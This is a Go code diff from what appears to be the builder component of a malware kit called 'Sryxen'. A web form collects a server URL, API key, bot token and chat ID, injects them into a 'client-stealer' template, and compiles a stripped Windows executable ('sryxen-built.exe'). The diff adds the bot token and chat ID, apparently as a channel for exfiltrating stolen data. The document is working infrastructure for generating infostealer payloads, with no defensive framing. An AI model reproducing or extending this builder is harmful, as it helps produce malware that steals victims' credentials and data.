@@ -39,21 +39,23 @@ func AddBuilderHandler(r *mux.Router) {
 }
 
 func HandleBuilderForm(w http.ResponseWriter, r *http.Request) {
-    err := r.ParseForm()  
+    err := r.ParseForm()
     if err != nil {
         http.Error(w, "Invalid form data", http.StatusBadRequest)
         return
     }
 
-    serverURL := r.FormValue("url")  
-    apiKey := r.FormValue("apiKey")  
+    serverURL := r.FormValue("url")
+    apiKey := r.FormValue("apiKey")
+    botToken := r.FormValue("botToken")
+    chatID := r.FormValue("chatID")
 
-    if serverURL == "" || apiKey == "" {
+    if serverURL == "" || apiKey == "" || botToken == "" || chatID == "" {
         http.Error(w, "Missing required fields", http.StatusBadRequest)
         return
     }
 
-    if err := GeneratePayload(serverURL, apiKey); err != nil {
+    if err := GeneratePayload(serverURL, apiKey, botToken, chatID); err != nil {
         http.Error(w, "Failed to generate payload: "+err.Error(), http.StatusInternalServerError)
         return
     }
@@ -63,7 +65,7 @@ func HandleBuilderForm(w http.ResponseWriter, r *http.Request) {
 }
 
 
-func GeneratePayload(serverURL, apiKey string) error {
+func GeneratePayload(serverURL, apiKey, botToken, chatID string) error {
     templateContent, err := ioutil.ReadFile("client-stealer/template.go")
     if err != nil {
         return fmt.Errorf("failed to read template: %v", err)
@@ -71,6 +73,8 @@ func GeneratePayload(serverURL, apiKey string) error {
 
     result := strings.ReplaceAll(string(templateContent), "%SERVER_URL_HERE%", serverURL)
     result = strings.ReplaceAll(result, "%SRYXEN_API_KEY_GENERATED%", apiKey)
+    result = strings.ReplaceAll(result, "%YOUR_BOT_TOKEN%", botToken)
+    result = strings.ReplaceAll(result, "%YOUR_CHAT_ID%", chatID)
 
     if err := ioutil.WriteFile("client-stealer/sryxen_payload.go", []byte(result), 0644); err != nil {
         return fmt.Errorf("failed to write payload: %v", err)
@@ -81,8 +85,8 @@ func GeneratePayload(serverURL, apiKey string) error {
         return fmt.Errorf("failed to get absolute path of client-stealer directory: %v", err)
     }
 
-	cmd := exec.Command("go", "build", "-trimpath", "-buildvcs=false", "-ldflags", "-s -w -buildid=", "-gcflags", "all=-l", "-o", "sryxen-built.exe", "sryxen_payload.go")
-    cmd.Dir = clientStealerDir 
+    cmd := exec.Command("go", "build", "-trimpath", "-buildvcs=false", "-ldflags", "-s -w -buildid=", "-gcflags", "all=-l", "-o", "sryxen-built.exe", "sryxen_payload.go")
+    cmd.Dir = clientStealerDir
 
     output, err := cmd.CombinedOutput()
     if err != nil {
